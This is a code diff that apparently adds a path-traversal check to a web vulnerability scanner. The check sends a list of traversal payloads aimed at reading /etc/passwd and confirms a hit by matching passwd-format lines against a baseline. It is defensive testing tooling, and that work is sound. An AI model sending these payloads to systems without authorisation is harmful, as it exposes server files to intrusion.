@@ -14,6 +14,7 @@ import base64
 import hashlib
 import hmac
 import json as _jsonmod
+import re
 import time
 import urllib.parse
 from dataclasses import dataclass, field
@@ -390,6 +391,70 @@ def verify_error_sqli(candidate: Candidate, transport: Transport) -> Verdict:
                        "the database error does not echo the injected input (no payload-adjacent evidence)")
     return Verdict(CONFIRMED, "sql-injection", loc,
                    f"a single quote broke a SQL string context ({sig!r}); the injected input is echoed in the database error")
+
+
+# --- path traversal / local file read (/etc/passwd disclosure) --------------------------------
+# Boundary is "start or any non-word char" so a passwd line survives an HTML wrapper (<pre>root:...)
+# as well as a bare newline, without matching 'myroot:' (a word char before 'root').
+_PT_ROOT_RE = re.compile(r"(?:^|[^\w])root:[^:\n]*:0:0:")
+_PT_SECOND_RE = re.compile(
+    r"(?:^|[^\w])(?:daemon|bin|sys|sync|nobody|nginx|www-data|mail|games|adm|lp):[^:\n]*:\d+:\d+:")
+_PT_WAF = (403, 406, 429, 451)
+
+
+def _is_passwd(body):
+    """A real /etc/passwd: the root uid-0 line AND a second passwd-format line. Two lines (not one
+    canonical 'root:x:0:0:' that a tutorial/WAF page could carry) is the precision gate."""
+    return bool(_PT_ROOT_RE.search(body)) and bool(_PT_SECOND_RE.search(body))
+
+
+def verify_path_traversal(candidate: Candidate, transport: Transport) -> Verdict:
+    """Oracle: a file/path param reads /etc/passwd. CONFIRMED needs >=2 passwd-format lines present
+    in a payload body and absent from a stable benign baseline. Body-first (the read may render in
+    a 500/200 either way). Scope (slice 1): *nix /etc/passwd; Windows + php://filter + base64 are
+    out of scope. Probes via the attacker session when present; reads only."""
+    loc = candidate.location
+    field = candidate.inject_field or "file"
+    agent = transport.by_role.get("attacker") or (
+        lambda u, method="GET", json=None: transport.request(method, u, json=json))
+
+    def send(value):
+        if candidate.method.upper() == "POST":
+            return agent(candidate.url, method="POST", json={field: value})
+        return agent(_with_param(candidate.url, field, value))
+
+    try:
+        _s1, b1 = send("index.html")
+        _s2, b2 = send("index.html")           # stable-baseline check
+    except Exception:
+        return Verdict(INCONCLUSIVE, "path-traversal", loc, "request raised an exception")
+    b1, b2 = b1 or "", b2 or ""
+    if b1 != b2:
+        return Verdict(INCONCLUSIVE, "path-traversal", loc, "unstable baseline — cannot test cleanly")
+    if _is_passwd(b1):
+        return Verdict(INCONCLUSIVE, "path-traversal", loc, "baseline already looks like /etc/passwd")
+    payloads = ["../../../etc/passwd", "../../../../../etc/passwd",
+                "../../../../../../../etc/passwd", "../../../../../../../../../../etc/passwd",
+                "....//....//....//....//etc/passwd",
+                "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
+                "/etc/passwd", "../../../../../../etc/passwd%00"]
+    reached = False
+    for value in payloads:
+        try:
+            status, body = send(value)
+        except Exception:
+            continue
+        if status in _PT_WAF:
+            return Verdict(INCONCLUSIVE, "path-traversal", loc, "probe appears policy-blocked (WAF)")
+        if not status:
+            continue
+        reached = True
+        if _is_passwd(body or ""):
+            return Verdict(CONFIRMED, "path-traversal", loc,
+                           f"local file read: /etc/passwd disclosed via {value!r}")
+    if not reached:
+        return Verdict(INCONCLUSIVE, "path-traversal", loc, "endpoint unreachable / erroring")
+    return Verdict(REJECTED, "path-traversal", loc, "no /etc/passwd disclosure")
 
 
 # --- OS command injection (execution-proven via shell arithmetic) -----------------------------
@@ -814,6 +879,7 @@ _REGISTRY: dict = {
     "reflected-xss": verify_reflected_xss,
     "ssrf": verify_ssrf,
     "command-injection": verify_cmd_injection,
+    "path-traversal": verify_path_traversal,
 }
 
 
